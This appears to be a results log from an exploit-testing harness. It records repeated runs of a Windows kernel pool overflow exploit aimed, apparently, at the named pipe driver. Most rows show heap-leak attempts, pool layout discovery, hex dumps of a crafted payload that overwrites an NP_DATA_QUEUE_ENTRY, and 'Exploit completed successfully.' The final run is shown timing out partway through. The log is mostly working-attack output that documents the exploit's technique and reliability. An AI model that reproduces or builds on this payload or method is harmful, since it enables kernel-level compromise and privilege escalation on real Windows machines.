    [000001E757E9BDC0]  FFFFE3084DB39488  FFFFE3084DB39488
    [000001E757E9BDD0]  000001E757AEFE50  FFFFE3084BE1C8A0
    [000001E757E9BDE0]  000000C000000001  00000000000000C0
    [000001E757E9BDF0]  0000000845504950  3939393939393939
    [000001E757E9BE00]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=9
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:28:28+00:00,1,3,3,running,running,True,success,0,21.125,True,True,79,28.481,1,65,14,2,"h=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 13 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 14 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 1 IoSB attempt 13 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=804 NpFr=904 pipeBase=900 pipeIndex=971 capture=1 iosbAttempt=13 pipeAttempt=0 pipeLeak=0
    [000001803CBCC8A0]  42536F490A100000  1DED768E03517D1F
    [000001803CBCC8B0]  E212DD01988C0DAF  0000000000000000
    [000001803CBCC8C0]  0000000000000000  0000000000000000
    [000001803CBCC8D0]  42536F490E0D0003  0000000000000000
    [000001803CBCC8E0]  000000000000000C  FFFFE3084DE638D0
    [000001803CBCC8F0]  00000000000003E8  6161616161616161
    [000001803CBCC900]  6161616161616161  6161616161616161
    [000001803CBCC910]  6161616161616161  6161616161616161
    [000001803CBCC920]  6161616161616161  6161616161616161
    [000001803CBCC930]  6161616161616161  6161616161616161
    [000001803CBCC940]  6161616161616161  6161616161616161
    [000001803CBCC950]  6161616161616161  6161616161616161
    [000001803CBCC960]  6161616161616161  6161616161616161
    [000001803CBCC970]  6161616161616161  6161616161616161
    [000001803CBCC980]  6161616161616161  6161616161616161
    [000001803CBCC990]  0000000000000000  0000000000000000
    [000001803CBCC9A0]  7246704E0A100000  1DED768E03517E1F
    [000001803CBCC9B0]  FFFFE3084E78E2A8  FFFFE3084E78E2A8
    [000001803CBCC9C0]  0000000000000000  FFFFE3084E144080
    [000001803CBCC9D0]  000000C000000000  00000000000000C0
    [000001803CBCC9E0]  000003CB45504950  3939393939393939
    [000001803CBCC9F0]  3939393939393939  3939393939393939
    [000001803CBCCA00]  3939393939393939  3939393939393939
    [000001803CBCCA10]  3939393939393939  3939393939393939
    [000001803CBCCA20]  3939393939393939  3939393939393939
    [000001803CBCCA30]  3939393939393939  3939393939393939
    [000001803CBCCA40]  3939393939393939  3939393939393939
    [000001803CBCCA50]  3939393939393939  3939393939393939
    [000001803CBCCA60]  3939393939393939  3939393939393939
    [000001803CBCCA70]  3939393939393939  3939393939393939
    [000001803CBCCA80]  3939393939393939  3939393939393939
    [000001803CBCCA90]  3939393939393939  DDDDDDDDFDFDFDFD
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001803CA7AA80]  7246704E0A100000  1DED768E03517E1F
    [000001803CA7AA90]  FFFFE3084E78E2A8  FFFFE3084E78E2A8
    [000001803CA7AAA0]  000001803C613A90  FFFFE3084E144080
    [000001803CA7AAB0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001803CA7AA70]  0000000000000000  0000000000000000
    [000001803CA7AA80]  7246704E0A100000  1DED768E03517E1F
    [000001803CA7AA90]  FFFFE3084E78E2A8  FFFFE3084E78E2A8
    [000001803CA7AAA0]  000001803C613A90  FFFFE3084E144080
    [000001803CA7AAB0]  000000C000000001  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=25
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:28:36+00:00,1,4,4,running,running,True,success,0,6.235,True,True,11,6.0,1,11,11,1,"gth=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 10 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 11 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 10 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 8 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=804 NpFr=904 pipeBase=900 pipeIndex=36 capture=0 iosbAttempt=10 pipeAttempt=0 pipeLeak=0
    [000001DEB2346B90]  42536F490A100000  1DED768E1BE6301F
    [000001DEB2346BA0]  E212DD0187E250AF  0000000000000000
    [000001DEB2346BB0]  0000000000000000  0000000000000000
    [000001DEB2346BC0]  42536F490E0D0003  0000000000000000
    [000001DEB2346BD0]  000000000000000C  FFFFE3084E8B8620
    [000001DEB2346BE0]  00000000000003E8  6161616161616161
    [000001DEB2346BF0]  6161616161616161  6161616161616161
    [000001DEB2346C00]  6161616161616161  6161616161616161
    [000001DEB2346C10]  6161616161616161  6161616161616161
    [000001DEB2346C20]  6161616161616161  6161616161616161
    [000001DEB2346C30]  6161616161616161  6161616161616161
    [000001DEB2346C40]  6161616161616161  6161616161616161
    [000001DEB2346C50]  6161616161616161  6161616161616161
    [000001DEB2346C60]  6161616161616161  6161616161616161
    [000001DEB2346C70]  6161616161616161  6161616161616161
    [000001DEB2346C80]  0000000000000000  0000000000000000
    [000001DEB2346C90]  7246704E0A100000  1DED768E1BE6311F
    [000001DEB2346CA0]  FFFFE3084E85F368  FFFFE3084E85F368
    [000001DEB2346CB0]  0000000000000000  FFFFE3084CA2DD60
    [000001DEB2346CC0]  000000C000000000  00000000000000C0
    [000001DEB2346CD0]  0000002445504950  3939393939393939
    [000001DEB2346CE0]  3939393939393939  3939393939393939
    [000001DEB2346CF0]  3939393939393939  3939393939393939
    [000001DEB2346D00]  3939393939393939  3939393939393939
    [000001DEB2346D10]  3939393939393939  3939393939393939
    [000001DEB2346D20]  3939393939393939  3939393939393939
    [000001DEB2346D30]  3939393939393939  3939393939393939
    [000001DEB2346D40]  3939393939393939  3939393939393939
    [000001DEB2346D50]  3939393939393939  3939393939393939
    [000001DEB2346D60]  3939393939393939  3939393939393939
    [000001DEB2346D70]  3939393939393939  3939393939393939
    [000001DEB2346D80]  3939393939393939  DDDDDDDDFDFDFDFD
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001DEB2911370]  7246704E0A100000  1DED768E1BE6311F
    [000001DEB2911380]  FFFFE3084E85F368  FFFFE3084E85F368
    [000001DEB2911390]  000001DEB23305B0  FFFFE3084CA2DD60
    [000001DEB29113A0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001DEB2911360]  0000000000000000  0000000000000000
    [000001DEB2911370]  7246704E0A100000  1DED768E1BE6311F
    [000001DEB2911380]  FFFFE3084E85F368  FFFFE3084E85F368
    [000001DEB2911390]  000001DEB23305B0  FFFFE3084CA2DD60
    [000001DEB29113A0]  000000C000000001  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=7
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:28:44+00:00,1,5,5,running,running,True,success,0,7.578,True,True,69,31.232,1,65,4,2," IoSB attempt 3 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 4 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 1 IoSB attempt 3 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=4 NpFr=104 pipeBase=100 pipeIndex=988 capture=1 iosbAttempt=3 pipeAttempt=0 pipeLeak=0
    [00000203E05DF3E0]  42536F490A100000  1DED768E0366C81F
    [00000203E05DF3F0]  E212DD01988DB8AF  0000000000000000
    [00000203E05DF400]  0000000000000000  0000000000000000
    [00000203E05DF410]  42536F490E0D0003  0000000000000000
    [00000203E05DF420]  000000000000000C  FFFFE3084E8C4590
    [00000203E05DF430]  00000000000003E8  6161616161616161
    [00000203E05DF440]  6161616161616161  6161616161616161
    [00000203E05DF450]  6161616161616161  6161616161616161
    [00000203E05DF460]  6161616161616161  6161616161616161
    [00000203E05DF470]  6161616161616161  6161616161616161
    [00000203E05DF480]  6161616161616161  6161616161616161
    [00000203E05DF490]  6161616161616161  6161616161616161
    [00000203E05DF4A0]  6161616161616161  6161616161616161
    [00000203E05DF4B0]  6161616161616161  6161616161616161
    [00000203E05DF4C0]  6161616161616161  6161616161616161
    [00000203E05DF4D0]  0000000000000000  0000000000000000
    [00000203E05DF4E0]  7246704E0A100000  1DED768E0366C91F
    [00000203E05DF4F0]  FFFFE3084E262368  FFFFE3084E262368
    [00000203E05DF500]  0000000000000000  FFFFE3084EBB3A20
    [00000203E05DF510]  000000C000000000  00000000000000C0
    [00000203E05DF520]  000003DC45504950  3939393939393939
    [00000203E05DF530]  3939393939393939  3939393939393939
    [00000203E05DF540]  3939393939393939  3939393939393939
    [00000203E05DF550]  3939393939393939  3939393939393939
    [00000203E05DF560]  3939393939393939  3939393939393939
    [00000203E05DF570]  3939393939393939  3939393939393939
    [00000203E05DF580]  3939393939393939  3939393939393939
    [00000203E05DF590]  3939393939393939  3939393939393939
    [00000203E05DF5A0]  3939393939393939  3939393939393939
    [00000203E05DF5B0]  3939393939393939  3939393939393939
    [00000203E05DF5C0]  3939393939393939  3939393939393939
    [00000203E05DF5D0]  3939393939393939  3939393939393939
    [00000203E05DF5E0]  7246704E0A100000  1DED768E0366CA1F
    [00000203E05DF5F0]  FFFFE3084E25FDE8  FFFFE3084E25FDE8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [00000203E05DF650]  7246704E0A100000  1DED768E0366C91F
    [00000203E05DF660]  FFFFE3084E262368  FFFFE3084E262368
    [00000203E05DF670]  00000203E0040610  FFFFE3084EBB3A20
    [00000203E05DF680]  000000C000000001  
 [*] Full payload to trigger overflow:
    [00000203E05DF640]  0000000000000000  0000000000000000
    [00000203E05DF650]  7246704E0A100000  1DED768E0366C91F
    [00000203E05DF660]  FFFFE3084E262368  FFFFE3084E262368
    [00000203E05DF670]  00000203E0040610  FFFFE3084EBB3A20
    [00000203E05DF680]  000000C000000001  00000000000000C0
    [00000203E05DF690]  000003DC45504950  3939393939393939
    [00000203E05DF6A0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=7
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:29:01+00:00,1,6,6,running,running,True,success,0,15.453,True,True,263,32.646,1,65,3,5,"oSB attempt 2 for capture 5
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 3 for capture 5
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 4 IoSB attempt 2 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=504 NpFr=604 pipeBase=600 pipeIndex=10 capture=4 iosbAttempt=2 pipeAttempt=0 pipeLeak=0
    [0000024611B74F80]  42536F490A100000  1DED768E0551F41F
    [0000024611B74F90]  E212DD01988DB4AF  0000000000000000
    [0000024611B74FA0]  0000000000000000  0000000000000000
    [0000024611B74FB0]  42536F490E0D0003  0000000000000000
    [0000024611B74FC0]  000000000000000C  FFFFE3084E8B8470
    [0000024611B74FD0]  00000000000003E8  6161616161616161
    [0000024611B74FE0]  6161616161616161  6161616161616161
    [0000024611B74FF0]  6161616161616161  6161616161616161
    [0000024611B75000]  6161616161616161  6161616161616161
    [0000024611B75010]  6161616161616161  6161616161616161
    [0000024611B75020]  6161616161616161  6161616161616161
    [0000024611B75030]  6161616161616161  6161616161616161
    [0000024611B75040]  6161616161616161  6161616161616161
    [0000024611B75050]  6161616161616161  6161616161616161
    [0000024611B75060]  6161616161616161  6161616161616161
    [0000024611B75070]  0000000000000000  0000000000000000
    [0000024611B75080]  7246704E0A100000  1DED768E0551F51F
    [0000024611B75090]  FFFFE3084C0827C8  FFFFE3084C0827C8
    [0000024611B750A0]  0000000000000000  FFFFE3084BE233E0
    [0000024611B750B0]  000000C000000000  00000000000000C0
    [0000024611B750C0]  0000000A45504950  3939393939393939
    [0000024611B750D0]  3939393939393939  3939393939393939
    [0000024611B750E0]  3939393939393939  3939393939393939
    [0000024611B750F0]  3939393939393939  3939393939393939
    [0000024611B75100]  3939393939393939  3939393939393939
    [0000024611B75110]  3939393939393939  3939393939393939
    [0000024611B75120]  3939393939393939  3939393939393939
    [0000024611B75130]  3939393939393939  3939393939393939
    [0000024611B75140]  3939393939393939  3939393939393939
    [0000024611B75150]  3939393939393939  3939393939393939
    [0000024611B75160]  3939393939393939  3939393939393939
    [0000024611B75170]  3939393939393939  3939393939393939
    [0000024611B75180]  7246704E0A100000  1DED768E0551F61F
    [0000024611B75190]  FFFFE3084E85AC28  FFFFE3084E85AC28
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [0000024611C870A0]  7246704E0A100000  1DED768E0551F51F
    [0000024611C870B0]  FFFFE3084C0827C8  FFFFE3084C0827C8
    [0000024611C870C0]  000002461172F8B0  FFFFE3084BE233E0
    [0000024611C870D0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [0000024611C87090]  0000000000000000  0000000000000000
    [0000024611C870A0]  7246704E0A100000  1DED768E0551F51F
    [0000024611C870B0]  FFFFE3084C0827C8  FFFFE3084C0827C8
    [0000024611C870C0]  000002461172F8B0  FFFFE3084BE233E0
    [0000024611C870D0]  000000C000000001  00000000000000C0
    [0000024611C870E0]  0000000A45504950  3939393939393939
    [0000024611C870F0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=14
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:29:06+00:00,1,7,7,running,running,True,success,0,3.219,True,True,3,2.0,1,3,3,1," 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 3 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 2 leak 1
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=104 NpFr=204 pipeBase=200 pipeIndex=8 capture=0 iosbAttempt=2 pipeAttempt=0 pipeLeak=0
    [00000212EF614DF0]  42536F490A100000  1DED768E3D54BF1F
    [00000212EF614E00]  E212DD0189F37FAF  0000000000000000
    [00000212EF614E10]  0000000000000000  0000000000000000
    [00000212EF614E20]  42536F490E0D0003  0000000000000000
    [00000212EF614E30]  000000000000000C  FFFFE3084E8BDE70
    [00000212EF614E40]  00000000000003E8  6161616161616161
    [00000212EF614E50]  6161616161616161  6161616161616161
    [00000212EF614E60]  6161616161616161  6161616161616161
    [00000212EF614E70]  6161616161616161  6161616161616161
    [00000212EF614E80]  6161616161616161  6161616161616161
    [00000212EF614E90]  6161616161616161  6161616161616161
    [00000212EF614EA0]  6161616161616161  6161616161616161
    [00000212EF614EB0]  6161616161616161  6161616161616161
    [00000212EF614EC0]  6161616161616161  6161616161616161
    [00000212EF614ED0]  6161616161616161  6161616161616161
    [00000212EF614EE0]  0000000000000000  0000000000000000
    [00000212EF614EF0]  7246704E0A100000  1DED768E3D54A01F
    [00000212EF614F00]  FFFFE3084C080BA8  FFFFE3084C080BA8
    [00000212EF614F10]  0000000000000000  FFFFE3084E35AD30
    [00000212EF614F20]  000000C000000000  00000000000000C0
    [00000212EF614F30]  0000000845504950  3939393939393939
    [00000212EF614F40]  3939393939393939  3939393939393939
    [00000212EF614F50]  3939393939393939  3939393939393939
    [00000212EF614F60]  3939393939393939  3939393939393939
    [00000212EF614F70]  3939393939393939  3939393939393939
    [00000212EF614F80]  3939393939393939  3939393939393939
    [00000212EF614F90]  3939393939393939  3939393939393939
    [00000212EF614FA0]  3939393939393939  3939393939393939
    [00000212EF614FB0]  3939393939393939  3939393939393939
    [00000212EF614FC0]  3939393939393939  3939393939393939
    [00000212EF614FD0]  3939393939393939  3939393939393939
    [00000212EF614FE0]  3939393939393939  3939393939393939
    [00000212EF614FF0]  7246704E0A100000  1DED768E3D54A11F
    [00000212EF615000]  FFFFE3084E78A6A8  FFFFE3084E78A6A8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [00000212EF55F380]  7246704E0A100000  1DED768E3D54A01F
    [00000212EF55F390]  FFFFE3084C080BA8  FFFFE3084C080BA8
    [00000212EF55F3A0]  00000212EF0EFA30  FFFFE3084E35AD30
    [00000212EF55F3B0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [00000212EF55F370]  0000000000000000  0000000000000000
    [00000212EF55F380]  7246704E0A100000  1DED768E3D54A01F
    [00000212EF55F390]  FFFFE3084C080BA8  FFFFE3084C080BA8
    [00000212EF55F3A0]  00000212EF0EFA30  FFFFE3084E35AD30
    [00000212EF55F3B0]  000000C000000001  00000000000000C0
    [00000212EF55F3C0]  0000000845504950  3939393939393939
    [00000212EF55F3D0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=2
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:34:10+00:00,1,8,8,running,running,True,timeout,124,301.672,False,False,294,30.391,1,65,24,6,"ta attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 19 for capture 6
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 20 for capture 6
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 21 for capture 6
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 22 for capture 6
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 23 for capture 6
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 24 for capture 6
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
